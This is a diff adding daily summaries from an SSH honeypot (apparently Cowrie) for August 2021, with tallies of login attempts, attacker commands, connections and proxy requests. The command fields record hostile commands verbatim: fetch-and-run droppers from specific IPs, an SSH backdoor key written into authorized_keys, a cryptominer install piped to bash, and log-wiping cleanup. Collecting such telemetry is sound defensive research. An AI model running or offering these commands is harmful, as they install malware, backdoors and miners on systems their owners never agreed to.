+        "positives": 0,
+        "total": 58
+      },
+      "count": 1
+    }
+  ],
+  "file_upload": [
+    {
+      "filename": "dota.tar.gz",
+      "src_ip": "60.222.233.208",
+      "count": 1
+    }
+  ],
+  "proxy_request": [
+    {
+      "src_ip": "5.182.39.75",
+      "dst_ip": "check2.zennolab.com",
+      "dst_port": 80,
+      "count": 1818
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "dst_ip": "chekfast.zennolab.com",
+      "dst_port": 80,
+      "count": 1684
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "dst_ip": "209.71.212.18",
+      "dst_port": 443,
+      "count": 1677
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "dst_ip": "chek.zennolab.com",
+      "dst_port": 80,
+      "count": 748
+    },
+    {
+      "src_ip": "45.227.255.205",
+      "dst_ip": "ya.ru",
+      "dst_port": 80,
+      "count": 639
     }
   ]
 },
@@ -6203,6 +7327,346 @@
   ]
 },
 {
+  "date": "2021-08-18",
+  "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02",
+  "passwords": [
+    {
+      "username": "root",
+      "password": "1234",
+      "count": 1943
+    },
+    {
+      "username": "user",
+      "password": "1",
+      "count": 24
+    },
+    {
+      "username": "root",
+      "password": "admin",
+      "count": 10
+    },
+    {
+      "username": "root",
+      "password": "root",
+      "count": 10
+    },
+    {
+      "username": "root",
+      "password": "",
+      "count": 6
+    }
+  ],
+  "commands": [
+    {
+      "input": "uname -s -v -n -r -m",
+      "count": 609
+    },
+    {
+      "input": "uname -a",
+      "count": 8
+    },
+    {
+      "input": "cat /proc/cpuinfo",
+      "count": 7
+    },
+    {
+      "input": "echo Hi | cat -n",
+      "count": 6
+    },
+    {
+      "input": "ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*",
+      "count": 6
+    }
+  ],
+  "pre_disconnect_command": [
+    {
+      "input": "uname -s -v -n -r -m",
+      "count": 609
+    },
+    {
+      "input": "echo Hi | cat -n",
+      "count": 6
+    },
+    {
+      "input": "cd /dev/shm || cd /tmp || cd /var/run || cd /mnt; wget 198.98.56.65/krax || curl -o krax 198.98.56.65/krax; tar xvf krax; cd ._lul; chmod +x *; ./krn; ./krane 1",
+      "count": 1
+    },
+    {
+      "input": "exit",
+      "count": 1
+    },
+    {
+      "input": "cd /var/run ; rm -rf tsh ; tftp -g 127.0.0.1 -r tsh ; sh tsh &",
+      "count": 1
+    }
+  ],
+  "connect": [
+    {
+      "src_ip": "173.249.33.179",
+      "dst_port": 2222,
+      "count": 868
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "dst_port": 2222,
+      "count": 667
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "dst_port": 2222,
+      "count": 601
+    },
+    {
+      "src_ip": "45.227.255.205",
+      "dst_port": 2222,
+      "count": 513
+    },
+    {
+      "src_ip": "49.233.175.111",
+      "dst_port": 2222,
+      "count": 161
+    }
+  ],
+  "session_closed": [
+    {
+      "src_ip": "173.249.33.179",
+      "robot": true,
+      "count": 868
+    },
+    {
+      "src_ip": "45.227.255.205",
+      "robot": true,
+      "count": 513
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "robot": true,
+      "count": 342
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "robot": false,
+      "count": 326
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "robot": false,
+      "count": 307
+    }
+  ],
+  "proxy_request": [
+    {
+      "src_ip": "5.182.39.75",
+      "dst_ip": "check2.zennolab.com",
+      "dst_port": 80,
+      "count": 1102
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "dst_ip": "chekfast.zennolab.com",
+      "dst_port": 80,
+      "count": 862
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "dst_ip": "chek.zennolab.com",
+      "dst_port": 80,
+      "count": 587
+    },
+    {
+      "src_ip": "45.227.255.205",
+      "dst_ip": "ya.ru",
+      "dst_port": 80,
+      "count": 513
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "dst_ip": "69.195.128.18",
+      "dst_port": 80,
+      "count": 348
+    }
+  ]
+},
+{
+  "date": "2021-08-09",
+  "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02",
+  "passwords": [
+    {
+      "username": "root",
+      "password": "1234",
+      "count": 2416
+    },
+    {
+      "username": "nproc",
+      "password": "nproc",
+      "count": 78
+    },
+    {
+      "username": "knockknockwhosthere",
+      "password": "knockknockwhosthere",
+      "count": 65
+    },
+    {
+      "username": "user",
+      "password": "1",
+      "count": 19
+    },
+    {
+      "username": "minerstat",
+      "password": "msos",
+      "count": 11
+    }
+  ],
+  "commands": [
+    {
+      "input": "uname -a",
+      "count": 217
+    },
+    {
+      "input": "nproc",
+      "count": 146
+    },
+    {
+      "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+      "count": 141
+    },
+    {
+      "input": "echo \"PROC:`nproc` VER:`uname -a`\"",
+      "count": 137
+    },
+    {
+      "input": "lscpu | grep Model",
+      "count": 78
+    }
+  ],
+  "pre_disconnect_command": [
+    {
+      "input": "uname -a",
+      "count": 137
+    },
+    {
+      "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+      "count": 77
+    },
+    {
+      "input": "cat /proc/cpuinfo | grep name | wc -l | head -c 30",
+      "count": 64
+    },
+    {
+      "input": "cat /etc/issue; cd /tmp; wget http://45.133.9.32/x86_64; chmod 777 *; ./x86_64 x86xhed; rm -rf *",
+      "count": 15
+    },
+    {
+      "input": "nproc",
+      "count": 9
+    }
+  ],
+  "connect": [
+    {
+      "src_ip": "5.182.39.75",
+      "dst_port": 2222,
+      "count": 645
+    },
+    {
+      "src_ip": "45.227.255.205",
+      "dst_port": 2222,
+      "count": 607
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "dst_port": 2222,
+      "count": 580
+    },
+    {
+      "src_ip": "81.241.216.79",
+      "dst_port": 2222,
+      "count": 259
+    },
+    {
+      "src_ip": "5.188.62.232",
+      "dst_port": 2222,
+      "count": 172
+    }
+  ],
+  "session_closed": [
+    {
+      "src_ip": "45.227.255.205",
+      "robot": true,
+      "count": 607
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "robot": false,
+      "count": 433
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "robot": false,
+      "count": 353
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "robot": true,
+      "count": 228
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "robot": true,
+      "count": 212
+    }
+  ],
+  "file_download": [
+    {
+      "url": null,
+      "outfile": "var/lib/cowrie/downloads/dfbd1b619d99b31b5c6f49fa2475421d8e35e14e0df2f2cf2a31ebaea84de3cb",
+      "scans": {
+        "positives": 0,
+        "total": 57
+      },
+      "count": 1
+    }
+  ],
+  "file_upload": [
+    {
+      "filename": "dota.tar.gz",
+      "src_ip": "58.220.87.226",
+      "count": 1
+    }
+  ],
+  "proxy_request": [
+    {
+      "src_ip": "5.182.39.75",
+      "dst_ip": "chekfast.zennolab.com",
+      "dst_port": 80,
+      "count": 1807
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "dst_ip": "check2.zennolab.com",
+      "dst_port": 80,
+      "count": 1717
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "dst_ip": "chek.zennolab.com",
+      "dst_port": 80,
+      "count": 926
+    },
+    {
+      "src_ip": "45.227.255.205",
+      "dst_ip": "ya.ru",
+      "dst_port": 80,
+      "count": 607
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "dst_ip": "69.195.128.18",
+      "dst_port": 80,
+      "count": 346
+    }
+  ]
+},
+{
   "date": "2021-07-31",
   "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02",
   "passwords": [
@@ -6969,6 +8433,178 @@
   ]
 },
 {
+  "date": "2021-08-15",
+  "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02",
+  "passwords": [
+    {
+      "username": "root",
+      "password": "1234",
+      "count": 2079
+    },
+    {
+      "username": "user",
+      "password": "1",
+      "count": 18
+    },
+    {
+      "username": "minerstat",
+      "password": "msos",
+      "count": 5
+    },
+    {
+      "username": "root",
+      "password": "root",
+      "count": 4
+    },
+    {
+      "username": "mos",
+      "password": "mos",
+      "count": 4
+    }
+  ],
+  "commands": [
+    {
+      "input": "cd /tmp; rm -rf x86_64; wget http://185.150.117.103/x86_64; curl -O http://185.150.117.103/x86_64; chmod 777 *; ./x86_64 x86_64; pkill xmirg; pkill Xorg; pkill Opera; pkill x86",
+      "count": 14
+    },
+    {
+      "input": "uname -a",
+      "count": 3
+    },
+    {
+      "input": "cd /dev/shm || cd /tmp || cd /var/run || cd /mnt; wget 198.98.56.65/krax || curl -o krax 198.98.56.65/krax; tar xvf krax; cd ._lul; chmod +x *; ./krn; ./krane Root12345",
+      "count": 2
+    },
+    {
+      "input": "curl: option -L not recognized\ncurl: try 'curl --help' or 'curl --manual' for more information\n",
+      "count": 2
+    },
+    {
+      "input": "curl -s -L https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh | bash -s 47v9mKikPcCZCq5mDn71ssWLDQ9UkrbiE2Tgu37BueHCHULTp5F6eHG1PA7X6o5RrW3tLjKVaCKrt23ATHn25hyy81iXQVL; curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/uninstall_c3pool_miner.sh | bash -s",
+      "count": 2
+    }
+  ],
+  "pre_disconnect_command": [
+    {
+      "input": "cd /tmp; rm -rf x86_64; wget http://185.150.117.103/x86_64; curl -O http://185.150.117.103/x86_64; chmod 777 *; ./x86_64 x86_64; pkill xmirg; pkill Xorg; pkill Opera; pkill x86",
+      "count": 14
+    },
+    {
+      "input": "cd /dev/shm || cd /tmp || cd /var/run || cd /mnt; wget 198.98.56.65/krax || curl -o krax 198.98.56.65/krax; tar xvf krax; cd ._lul; chmod +x *; ./krn; ./krane Root12345",
+      "count": 2
+    },
+    {
+      "input": "curl: option -L not recognized\ncurl: try 'curl --help' or 'curl --manual' for more information\n",
+      "count": 2
+    },
+    {
+      "input": "uname -s -m",
+      "count": 1
+    },
+    {
+      "input": "cd /dev/shm || cd /tmp || cd /var/run || cd /mnt; wget 198.98.56.65/krax || curl -o krax 198.98.56.65/krax; tar xvf krax; cd ._lul; chmod +x *; ./krn; ./krane 1",
+      "count": 1
+    }
+  ],
+  "connect": [
+    {
+      "src_ip": "182.150.48.140",
+      "dst_port": 2222,
+      "count": 1542
+    },
+    {
+      "src_ip": "45.227.255.205",
+      "dst_port": 2222,
+      "count": 577
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "dst_port": 2222,
+      "count": 549
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "dst_port": 2222,
+      "count": 546
+    },
+    {
+      "src_ip": "49.233.175.111",
+      "dst_port": 2222,
+      "count": 160
+    }
+  ],
+  "session_closed": [
+    {
+      "src_ip": "182.150.48.140",
+      "robot": true,
+      "count": 1517
+    },
+    {
+      "src_ip": "45.227.255.205",
+      "robot": true,
+      "count": 576
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "robot": false,
+      "count": 292
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "robot": false,
+      "count": 279
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "robot": true,
+      "count": 266
+    }
+  ],
+  "file_download": [
+    {
+      "url": "http://185.150.117.103/x86_64",
+      "outfile": "var/lib/cowrie/downloads/f8a451e0779f556a804bcb27ab533ad1ed885b4c4b28ce02b02d84cfb4abfca4",
+      "scans": {
+        "positives": 38,
+        "total": 62
+      },
+      "count": 1
+    }
+  ],
+  "proxy_request": [
+    {
+      "src_ip": "5.182.39.75",
+      "dst_ip": "chekfast.zennolab.com",
+      "dst_port": 80,
+      "count": 1262
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "dst_ip": "check2.zennolab.com",
+      "dst_port": 80,
+      "count": 828
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "dst_ip": "chek.zennolab.com",
+      "dst_port": 80,
+      "count": 727
+    },
+    {
+      "src_ip": "45.227.255.205",
+      "dst_ip": "ya.ru",
+      "dst_port": 80,
+      "count": 577
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "dst_ip": "ya.ru",
+      "dst_port": 80,
+      "count": 266
+    }
+  ]
+},
+{
   "date": "2021-06-15",
   "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02",
   "passwords": [
@@ -7617,6 +9253,167 @@
       "dst_ip": "ya.ru",
       "dst_port": 80,
       "count": 932
+    }
+  ]
+},
+{
+  "date": "2021-08-14",
+  "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02",
+  "passwords": [
+    {
+      "username": "root",
+      "password": "1234",
+      "count": 2239
+    },
+    {
+      "username": "user",
+      "password": "1",
+      "count": 17
+    },
+    {
+      "username": "root",
+      "password": "root",
+      "count": 8
+    },
+    {
+      "username": "minerstat",
+      "password": "msos",
+      "count": 7
+    },
+    {
+      "username": "pi",
+      "password": "raspberry",
+      "count": 6
+    }
+  ],
+  "commands": [
+    {
+      "input": "cat /etc/issue",
+      "count": 24
+    },
+    {
+      "input": "uname -a && lscpu",
+      "count": 7
+    },
+    {
+      "input": "cat /proc/cpuinfo",
+      "count": 2
+    },
+    {
+      "input": "ps -x",
+      "count": 2
+    },
+    {
+      "input": "free -m",
+      "count": 2
+    }
+  ],
+  "pre_disconnect_command": [
+    {
+      "input": "cat /etc/issue",
+      "count": 24
+    },
+    {
+      "input": "uname -a && lscpu",
+      "count": 7
+    },
+    {
+      "input": "cat /proc/cpuinfo",
+      "count": 2
+    },
+    {
+      "input": "cd /var/run ; rm -rf tsh ; tftp -g 127.0.0.1 -r tsh ; sh tsh &",
+      "count": 2
+    },
+    {
+      "input": "uname -s -m",
+      "count": 1
+    }
+  ],
+  "connect": [
+    {
+      "src_ip": "45.227.255.205",
+      "dst_port": 2222,
+      "count": 605
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "dst_port": 2222,
+      "count": 585
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "dst_port": 2222,
+      "count": 450
+    },
+    {
+      "src_ip": "5.188.62.229",
+      "dst_port": 2222,
+      "count": 225
+    },
+    {
+      "src_ip": "49.233.175.111",
+      "dst_port": 2222,
+      "count": 162
+    }
+  ],
+  "session_closed": [
+    {
+      "src_ip": "45.227.255.205",
+      "robot": true,
+      "count": 605
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "robot": true,
+      "count": 356
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "robot": false,
+      "count": 319
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "robot": true,
+      "count": 267
+    },
+    {
+      "src_ip": "5.188.62.229",
+      "robot": false,
+      "count": 213
+    }
+  ],
+  "proxy_request": [
+    {
+      "src_ip": "45.227.255.205",
+      "dst_ip": "ya.ru",
+      "dst_port": 80,
+      "count": 605
+    },
+    {
+      "src_ip": "5.188.62.223",
+      "dst_ip": "auth.api.np.ac.playstation.net",
+      "dst_port": 443,
+      "count": 385
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "dst_ip": "ya.ru",
+      "dst_port": 80,
+      "count": 356
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "dst_ip": "69.195.128.18",
+      "dst_port": 80,
+      "count": 321
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "dst_ip": "ya.ru",
+      "dst_port": 80,
+      "count": 267
     }
   ]
 },
@@ -9385,6 +11182,330 @@
   ]
 },
 {
+  "date": "2021-08-11",
+  "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02",
+  "passwords": [
+    {
+      "username": "root",
+      "password": "1234",
+      "count": 2620
+    },
+    {
+      "username": "user",
+      "password": "1",
+      "count": 10
+    },
+    {
+      "username": "minerstat",
+      "password": "msos",
+      "count": 10
+    },
+    {
+      "username": "pi",
+      "password": "raspberry",
+      "count": 3
+    },
+    {
+      "username": "pi",
+      "password": "raspberryraspberry993311",
+      "count": 3
+    }
+  ],
+  "commands": [
+    {
+      "input": "cd /var/run ; rm -rf tsh ; tftp -g 127.0.0.1 -r tsh ; sh tsh &",
+      "count": 2
+    },
+    {
+      "input": "curl http://71.127.148.69/.x/3sh | sh",
+      "count": 2
+    },
+    {
+      "input": "rm -rf /tmp/2sh; wget -c http://71.127.148.69/.x/2sh -P /tmp && sh /tmp/2sh &",
+      "count": 2
+    },
+    {
+      "input": "wget -qO - http://71.127.148.69/.x/2sh | sh > /dev/null 2>&1 &",
+      "count": 2
+    },
+    {
+      "input": "rm -rf /var/run/1sh; wget -c http://71.127.148.69/.x/1sh -P /var/run && sh /var/run/1sh &",
+      "count": 2
+    }
+  ],
+  "pre_disconnect_command": [
+    {
+      "input": "cd /var/run ; rm -rf tsh ; tftp -g 127.0.0.1 -r tsh ; sh tsh &",
+      "count": 2
+    },
+    {
+      "input": "cd /dev/shm || cd /tmp || cd /var/run || cd /mnt; wget 198.98.56.65/krax || curl -o krax 198.98.56.65/krax; tar xvf krax; cd ._lul; chmod +x *; ./krn; ./krane Root12345",
+      "count": 1
+    }
+  ],
+  "connect": [
+    {
+      "src_ip": "5.182.39.75",
+      "dst_port": 2222,
+      "count": 710
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "dst_port": 2222,
+      "count": 613
+    },
+    {
+      "src_ip": "45.227.255.205",
+      "dst_port": 2222,
+      "count": 598
+    },
+    {
+      "src_ip": "5.188.62.219",
+      "dst_port": 2222,
+      "count": 220
+    },
+    {
+      "src_ip": "5.188.62.229",
+      "dst_port": 2222,
+      "count": 172
+    }
+  ],
+  "session_closed": [
+    {
+      "src_ip": "45.227.255.205",
+      "robot": true,
+      "count": 598
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "robot": false,
+      "count": 435
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "robot": false,
+      "count": 354
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "robot": true,
+      "count": 274
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "robot": true,
+      "count": 259
+    }
+  ],
+  "proxy_request": [
+    {
+      "src_ip": "5.182.39.75",
+      "dst_ip": "check2.zennolab.com",
+      "dst_port": 80,
+      "count": 1877
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "dst_ip": "chekfast.zennolab.com",
+      "dst_port": 80,
+      "count": 1406
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "dst_ip": "chek.zennolab.com",
+      "dst_port": 80,
+      "count": 1404
+    },
+    {
+      "src_ip": "45.227.255.205",
+      "dst_ip": "ya.ru",
+      "dst_port": 80,
+      "count": 598
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "dst_ip": "209.71.212.18",
+      "dst_port": 443,
+      "count": 501
+    }
+  ]
+},
+{
+  "date": "2021-08-10",
+  "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02",
+  "passwords": [
+    {
+      "username": "root",
+      "password": "1234",
+      "count": 2760
+    },
+    {
+      "username": "knockknockwhosthere",
+      "password": "knockknockwhosthere",
+      "count": 71
+    },
+    {
+      "username": "user",
+      "password": "1",
+      "count": 15
+    },
+    {
+      "username": "root",
+      "password": "1",
+      "count": 13
+    },
+    {
+      "username": "nproc",
+      "password": "nproc",
+      "count": 12
+    }
+  ],
+  "commands": [
+    {
+      "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+      "count": 83
+    },
+    {
+      "input": "cat /proc/cpuinfo | grep name | wc -l | head -c 30",
+      "count": 72
+    },
+    {
+      "input": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://205.185.126.121/8UsA.sh; curl -O http://205.185.126.121/8UsA.sh; chmod 777 8UsA.sh; sh 8UsA.sh; tftp 205.185.126.121 -c get t8UsA.sh; chmod 777 t8UsA.sh; sh t8UsA.sh; tftp -r t8UsA2.sh -g 205.185.126.121; chmod 777 t8UsA2.sh; sh t8UsA2.sh; ftpget -v -u anonymous -p anonymous -P 21 205.185.126.121 8UsA1.sh 8UsA1.sh; sh 8UsA1.sh; rm -rf 8UsA.sh t8UsA.sh t8UsA2.sh 8UsA1.sh; rm -rf *",
+      "count": 13
+    },
+    {
+      "input": "lscpu | grep Model",
+      "count": 12
+    },
+    {
+      "input": "uname -a",
+      "count": 12
+    }
+  ],
+  "pre_disconnect_command": [
+    {
+      "input": "cat /proc/cpuinfo | grep name | wc -l | head -c 30",
+      "count": 72
+    },
+    {
+      "input": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://205.185.126.121/8UsA.sh; curl -O http://205.185.126.121/8UsA.sh; chmod 777 8UsA.sh; sh 8UsA.sh; tftp 205.185.126.121 -c get t8UsA.sh; chmod 777 t8UsA.sh; sh t8UsA.sh; tftp -r t8UsA2.sh -g 205.185.126.121; chmod 777 t8UsA2.sh; sh t8UsA2.sh; ftpget -v -u anonymous -p anonymous -P 21 205.185.126.121 8UsA1.sh 8UsA1.sh; sh 8UsA1.sh; rm -rf 8UsA.sh t8UsA.sh t8UsA2.sh 8UsA1.sh; rm -rf *",
+      "count": 13
+    },
+    {
+      "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+      "count": 11
+    },
+    {
+      "input": "rm -rf /var/tmp/dota*",
+      "count": 1
+    }
+  ],
+  "connect": [
+    {
+      "src_ip": "5.182.39.75",
+      "dst_port": 2222,
+      "count": 753
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "dst_port": 2222,
+      "count": 728
+    },
+    {
+      "src_ip": "45.227.255.205",
+      "dst_port": 2222,
+      "count": 672
+    },
+    {
+      "src_ip": "5.188.62.223",
+      "dst_port": 2222,
+      "count": 216
+    },
+    {
+      "src_ip": "49.233.175.111",
+      "dst_port": 2222,
+      "count": 163
+    }
+  ],
+  "session_closed": [
+    {
+      "src_ip": "45.227.255.205",
+      "robot": true,
+      "count": 672
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "robot": false,
+      "count": 431
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "robot": false,
+      "count": 385
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "robot": true,
+      "count": 342
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "robot": true,
+      "count": 323
+    }
+  ],
+  "file_download": [
+    {
+      "url": null,
+      "outfile": "var/lib/cowrie/downloads/65d83adcd3061175f1a32ddec65458f46a3b3e358e88337a8a62b056f8581af6",
+      "scans": {
+        "positives": 0,
+        "total": 57
+      },
+      "count": 1
+    }
+  ],
+  "file_upload": [
+    {
+      "filename": "dota.tar.gz",
+      "src_ip": "58.65.136.170",
+      "count": 1
+    }
+  ],
+  "proxy_request": [
+    {
+      "src_ip": "5.182.39.75",
+      "dst_ip": "chekfast.zennolab.com",
+      "dst_port": 80,
+      "count": 1625
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "dst_ip": "chek.zennolab.com",
+      "dst_port": 80,
+      "count": 1624
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "dst_ip": "check2.zennolab.com",
+      "dst_port": 80,
+      "count": 1380
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "dst_ip": "209.71.212.18",
+      "dst_port": 443,
+      "count": 768
+    },
+    {
+      "src_ip": "45.227.255.205",
+      "dst_ip": "ya.ru",
+      "dst_port": 80,
+      "count": 672
+    }
+  ]
+},
+{
   "date": "2021-03-12",
   "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01",
   "passwords": [
@@ -9631,6 +11752,167 @@
   ]
 },
 {
+  "date": "2021-08-06",
+  "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02",
+  "passwords": [
+    {
+      "username": "root",
+      "password": "1234",
+      "count": 2385
+    },
+    {
+      "username": "nproc",
+      "password": "nproc",
+      "count": 479
+    },
+    {
+      "username": "user",
+      "password": "1",
+      "count": 10
+    },
+    {
+      "username": "root",
+      "password": "123456a@",
+      "count": 5
+    },
+    {
+      "username": "airadmin",
+      "password": "airadmin",
+      "count": 5
+    }
+  ],
+  "commands": [
+    {
+      "input": "echo -e \"\\x6F\\x6B\"",
+      "count": 601
+    },
+    {
+      "input": "cat /proc/cpuinfo | grep name | wc -l",
+      "count": 487
+    },
+    {
+      "input": "uname -a",
+      "count": 486
+    },
+    {
+      "input": "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
+      "count": 486
+    },
+    {
+      "input": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
+      "count": 486
+    }
+  ],
+  "pre_disconnect_command": [
+    {
+      "input": "echo -e \"\\x6F\\x6B\"",
+      "count": 601
+    },
+    {
+      "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+      "count": 483
+    },
+    {
+      "input": "echo Hi | cat -n",
+      "count": 2
+    },
+    {
+      "input": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://109.104.151.112/multi/bins/setup; curl -O http://109.104.151.112/multi/bins/setup; chmod 777 setup; chmod +x setup; ./setup Fiber.x86; rm -rf setup; history -c",
+      "count": 1
+    },
+    {
+      "input": "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
+      "count": 1
+    }
+  ],
+  "connect": [
+    {
+      "src_ip": "5.182.39.75",
+      "dst_port": 2222,
+      "count": 618
+    },
+    {
+      "src_ip": "101.201.120.211",
+      "dst_port": 2222,
